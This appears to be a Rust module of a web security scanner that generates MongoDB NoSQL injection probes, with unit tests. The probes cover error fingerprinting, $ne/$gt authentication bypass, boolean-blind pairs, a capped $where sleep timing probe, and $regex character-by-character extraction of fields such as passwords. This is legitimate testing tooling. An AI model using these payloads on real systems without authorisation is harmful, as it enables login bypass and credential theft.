//! NoSQL injection payload generation (MongoDB-focused, detection-oriented).
//!
//! Every payload is composed from a technique + an injection style, passed
//! through the `safety` gate, and carries a rationale. Nothing here is a
//! stored attack string: each probe names the question it asks. All forms are
//! read-only — operator injection reshapes a *query predicate*, never a write.

use crate::safety;
use serde::{Deserialize, Serialize};

/// Where the operator is injected.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum InjectionStyle {
    /// Query-string bracket notation: `user[$ne]=x` (parsed to an object by
    /// `qs`/Express-style body parsers).
    QueryBracket,
    /// A JSON request body with an operator object: `{"user":{"$ne":null}}`.
    JsonBody,
}

/// The logical NoSQL technique a probe expresses.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum NoSqlTechnique {
    /// Malformed operator to elicit a driver error signature.
    ErrorProbe,
    /// Authentication/filter bypass via a truthy operator (`$ne`, `$gt`).
    AuthBypass,
    /// Matched true/false differential (`$ne` truthy vs `$in:[]` falsy).
    BooleanBlind,
    /// Server-side `$where` conditional delay (capped).
    WhereTiming,
    /// Read-only `$regex` character inference.
    RegexExtraction,
}

impl NoSqlTechnique {
    pub fn label(&self) -> &'static str {
        match self {
            Self::ErrorProbe => "error_probe",
            Self::AuthBypass => "auth_bypass",
            Self::BooleanBlind => "boolean_blind",
            Self::WhereTiming => "where_timing",
            Self::RegexExtraction => "regex_extraction",
        }
    }
}

/// A single composed probe. The run layer turns this into an HTTP request.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct NoSqlProbe {
    pub id: uuid::Uuid,
    pub technique: NoSqlTechnique,
    pub style: InjectionStyle,
    /// A stable logical label used for fingerprint dedup and reporting.
    pub logical_label: String,
    /// For `QueryBracket`: the replacement key, e.g. `user[$ne]`. The value is
    /// in `value`.
    pub query_key: Option<String>,
    /// For `QueryBracket`: the value placed at the (possibly rewritten) key.
    pub value: String,
    /// For `JsonBody`: the full JSON body to send (Content-Type
    /// application/json). The target parameter's value is replaced with an
    /// operator object; other fields are left as the baseline object.
    pub json_body: Option<String>,
    /// Whether this probe is expected to be the truthy arm of a differential.
    pub expected_truthy: Option<bool>,
    pub rationale: String,
}

/// Build the probe with the safety gate applied. Returns `None` (and is a bug)
/// if a generated payload fails the read-only gate — the gate is the invariant.
fn gated(probe: NoSqlProbe) -> Option<NoSqlProbe> {
    let surface = probe
        .json_body
        .clone()
        .unwrap_or_else(|| format!("{}={}", probe.query_key.clone().unwrap_or_default(), probe.value));
    match safety::validate(&surface) {
        Ok(()) => Some(probe),
        Err(_) => None,
    }
}

fn new_probe(
    technique: NoSqlTechnique,
    style: InjectionStyle,
    logical_label: impl Into<String>,
    rationale: impl Into<String>,
) -> NoSqlProbe {
    NoSqlProbe {
        id: uuid::Uuid::new_v4(),
        technique,
        style,
        logical_label: logical_label.into(),
        query_key: None,
        value: String::new(),
        json_body: None,
        expected_truthy: None,
        rationale: rationale.into(),
    }
}

/// Error-eliciting operator misuse (both styles).
pub fn error_probes(param: &str, original: &str) -> Vec<NoSqlProbe> {
    let mut out = Vec::new();
    // Bracket: an operator with a malformed value shape.
    out.extend(gated(NoSqlProbe {
        query_key: Some(format!("{param}[$gt]")),
        value: original.to_string(),
        ..new_probe(
            NoSqlTechnique::ErrorProbe,
            InjectionStyle::QueryBracket,
            "error:bracket-$gt",
            "reshape the param into a $gt object; a MongoError/CastError names the datastore",
        )
    }));
    // JSON body: an operator that mixes types to provoke a driver error.
    out.extend(gated(NoSqlProbe {
        json_body: Some(format!("{{\"{param}\":{{\"$in\":\"not-an-array\"}}}}")),
        ..new_probe(
            NoSqlTechnique::ErrorProbe,
            InjectionStyle::JsonBody,
            "error:json-$in-typemismatch",
            "$in with a non-array value elicits a parse error that fingerprints the driver",
        )
    }));
    out
}

/// Authentication / filter bypass probes (truthy operators).
pub fn auth_bypass_probes(param: &str) -> Vec<NoSqlProbe> {
    let mut out = Vec::new();
    out.extend(gated(NoSqlProbe {
        query_key: Some(format!("{param}[$ne]")),
        value: String::new(),
        expected_truthy: Some(true),
        ..new_probe(
            NoSqlTechnique::AuthBypass,
            InjectionStyle::QueryBracket,
            "authbypass:bracket-$ne-empty",
            "`{param}[$ne]=` matches any non-empty value; a changed response suggests the operator reached the query",
        )
    }));
    out.extend(gated(NoSqlProbe {
        json_body: Some(format!("{{\"{param}\":{{\"$ne\":null}}}}")),
        expected_truthy: Some(true),
        ..new_probe(
            NoSqlTechnique::AuthBypass,
            InjectionStyle::JsonBody,
            "authbypass:json-$ne-null",
            "`{param}:{$ne:null}` is a truthy predicate; a differential vs baseline indicates injection",
        )
    }));
    out
}

/// A matched true/false pair for boolean-blind inference.
///
/// The two arms are logically opposite so a genuine difference between *them*
/// (not merely vs baseline) is the evidence.
pub fn boolean_pair(param: &str) -> Vec<NoSqlProbe> {
    let mut out = Vec::new();
    // TRUE: $ne of an impossible sentinel → always matches.
    out.extend(gated(NoSqlProbe {
        json_body: Some(format!("{{\"{param}\":{{\"$ne\":\"__nx_{}\"}}}}", short_tag())),
        expected_truthy: Some(true),
        ..new_probe(
            NoSqlTechnique::BooleanBlind,
            InjectionStyle::JsonBody,
            "boolean:true-$ne-sentinel",
            "truthy arm: $ne of a random sentinel matches every real row",
        )
    }));
    // FALSE: $in empty array → matches nothing.
    out.extend(gated(NoSqlProbe {
        json_body: Some(format!("{{\"{param}\":{{\"$in\":[]}}}}")),
        expected_truthy: Some(false),
        ..new_probe(
            NoSqlTechnique::BooleanBlind,
            InjectionStyle::JsonBody,
            "boolean:false-$in-empty",
            "falsy arm: $in:[] matches nothing; must differ from the truthy arm to count",
        )
    }));
    out
}

/// A capped `$where` timing probe. `requested_ms` is clamped by the safety gate.
pub fn where_timing(param: &str, requested_ms: u64) -> Vec<NoSqlProbe> {
    let ms = safety::clamp_sleep_ms(requested_ms);
    // A read-only sleep expression: no writes, no unbounded loop.
    let body = format!("{{\"{param}\":{{\"$where\":\"sleep({ms})\"}}}}");
    gated(NoSqlProbe {
        json_body: Some(body),
        ..new_probe(
            NoSqlTechnique::WhereTiming,
            InjectionStyle::JsonBody,
            format!("timing:$where-sleep-{ms}ms"),
            "conditional server-side delay; only a statistically separated distribution counts",
        )
    })
    .into_iter()
    .collect()
}

/// Read-only `$regex` character-inference probes for one position.
///
/// For a targeted field, this builds a `^<known><candidate>` anchored regex per
/// candidate character. The run layer sends them and infers which matched by
/// the boolean differential. Strictly read-only and bounded by the caller's
/// request budget and `max_len`.
pub fn regex_extraction_step(
    param: &str,
    field: &str,
    known_prefix: &str,
    alphabet: &str,
) -> Vec<NoSqlProbe> {
    let mut out = Vec::new();
    for ch in alphabet.chars() {
        // Escape regex metacharacters in the assembled prefix so only the
        // structure we intend is matched.
        let pattern = format!("^{}{}", regex_escape(known_prefix), regex_escape(&ch.to_string()));
        let body = format!("{{\"{field}\":{{\"$regex\":\"{pattern}\"}}}}");
        out.extend(gated(NoSqlProbe {
            json_body: Some(body),
            value: ch.to_string(),
            expected_truthy: Some(true),
            ..new_probe(
                NoSqlTechnique::RegexExtraction,
                InjectionStyle::JsonBody,
                format!("regex:{field}:prefix{}:char", known_prefix.len()),
                format!("does '{field}' start with '{known_prefix}{ch}'? a match narrows the value read-only"),
            )
        }));
    }
    let _ = param;
    out
}

/// The guaranteed **no-match** pole for the extraction oracle.
///
/// `^￿` anchors on U+FFFF, a Unicode noncharacter that never appears in a
/// real field value, so this pattern selects zero rows by construction. The
/// extractor compares every candidate against this pole: a candidate "matches"
/// only when its response *differs* from this guaranteed-empty response. If a
/// guaranteed-no-match probe cannot be distinguished from a guaranteed-match
/// probe, the oracle is dead and extraction must abort rather than fabricate.
pub fn regex_impossible_probe(field: &str) -> Option<NoSqlProbe> {
    // `￿` is a valid JSON escape, so the body stays well-formed and the
    // driver receives the literal noncharacter — no backslash-escaping hazard.
    let body = format!("{{\"{field}\":{{\"$regex\":\"^\\uFFFF\"}}}}");
    gated(NoSqlProbe {
        json_body: Some(body),
        expected_truthy: Some(false),
        ..new_probe(
            NoSqlTechnique::RegexExtraction,
            InjectionStyle::JsonBody,
            format!("regex:{field}:impossible-control"),
            "no-match pole: an anchored noncharacter regex selects zero rows; \
             any candidate that differs from this response matched",
        )
    })
}

/// The guaranteed **match-all** pole for the extraction oracle.
///
/// `^` matches every string, so this pattern selects the same rows an unfiltered
/// predicate would. Paired with [`regex_impossible_probe`], it lets the
/// extractor prove the oracle is *live* before trusting any inference: if the
/// match-all and no-match responses are indistinguishable, the endpoint's output
/// does not depend on the predicate and no value can be honestly recovered.
pub fn regex_match_all_probe(field: &str) -> Option<NoSqlProbe> {
    let body = format!("{{\"{field}\":{{\"$regex\":\"^\"}}}}");
    gated(NoSqlProbe {
        json_body: Some(body),
        expected_truthy: Some(true),
        ..new_probe(
            NoSqlTechnique::RegexExtraction,
            InjectionStyle::JsonBody,
            format!("regex:{field}:matchall-control"),
            "match-all pole: an anchored empty regex matches every row; \
             establishes the truthy response the oracle must distinguish",
        )
    })
}

/// Minimal regex-metacharacter escaping.
fn regex_escape(s: &str) -> String {
    let mut out = String::with_capacity(s.len());
    for c in s.chars() {
        if "\\^$.|?*+()[]{}".contains(c) {
            out.push('\\');
        }
        out.push(c);
    }
    out
}

/// A short random tag from a UUID (no `rand` dependency).
fn short_tag() -> String {
    let b = uuid::Uuid::new_v4().into_bytes();
    format!("{:02x}{:02x}{:02x}", b[0], b[1], b[2])
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn auth_bypass_produces_both_styles() {
        let p = auth_bypass_probes("user");
        assert!(p.iter().any(|x| x.style == InjectionStyle::QueryBracket));
        assert!(p.iter().any(|x| x.style == InjectionStyle::JsonBody));
        assert!(p.iter().all(|x| x.technique == NoSqlTechnique::AuthBypass));
    }

    #[test]
    fn boolean_pair_is_matched_and_opposite() {
        let p = boolean_pair("user");
        assert_eq!(p.len(), 2);
        assert!(p.iter().any(|x| x.expected_truthy == Some(true)));
        assert!(p.iter().any(|x| x.expected_truthy == Some(false)));
    }

    #[test]
    fn every_generated_payload_passes_the_safety_gate() {
        let mut all = Vec::new();
        all.extend(error_probes("user", "1"));
        all.extend(auth_bypass_probes("user"));
        all.extend(boolean_pair("user"));
        all.extend(where_timing("user", 2000));
        all.extend(regex_extraction_step("user", "password", "a", "abc"));
        assert!(!all.is_empty());
        for probe in &all {
            let surface = probe
                .json_body
                .clone()
                .unwrap_or_else(|| format!("{}={}", probe.query_key.clone().unwrap_or_default(), probe.value));
            assert!(safety::validate(&surface).is_ok(), "leaked unsafe payload: {surface}");
        }
    }

    #[test]
    fn where_timing_is_capped() {
        let p = where_timing("user", 999_999);
        assert_eq!(p.len(), 1);
        // The clamped value, not the requested one, appears in the payload.
        assert!(p[0].json_body.as_ref().unwrap().contains(&format!("sleep({})", safety::MAX_WHERE_SLEEP_MS)));
    }

    #[test]
    fn regex_extraction_covers_the_alphabet() {
        let p = regex_extraction_step("user", "password", "", "abc");
        assert_eq!(p.len(), 3);
        assert!(p.iter().all(|x| x.technique == NoSqlTechnique::RegexExtraction));
        assert!(p.iter().all(|x| x.json_body.as_ref().unwrap().contains("$regex")));
    }

    #[test]
    fn regex_escaping_neutralizes_metacharacters() {
        assert_eq!(regex_escape("a.b*c"), "a\\.b\\*c");
    }

    #[test]
    fn oracle_poles_are_generated_and_gated() {
        let no_match = regex_impossible_probe("password").expect("impossible pole");
        let match_all = regex_match_all_probe("password").expect("match-all pole");
        // Both are read-only $regex predicates and pass the safety gate.
        for p in [&no_match, &match_all] {
            assert_eq!(p.technique, NoSqlTechnique::RegexExtraction);
            let body = p.json_body.as_ref().unwrap();
            assert!(body.contains("$regex"));
            assert!(safety::validate(body).is_ok(), "pole leaked past safety gate: {body}");
        }
        // The poles are logical opposites and produce valid, well-formed JSON.
        assert_eq!(no_match.expected_truthy, Some(false));
        assert_eq!(match_all.expected_truthy, Some(true));
        let nm: serde_json::Value =
            serde_json::from_str(no_match.json_body.as_ref().unwrap()).expect("no-match is valid JSON");
        let ma: serde_json::Value =
            serde_json::from_str(match_all.json_body.as_ref().unwrap()).expect("match-all is valid JSON");
        assert_ne!(nm, ma);
    }
}
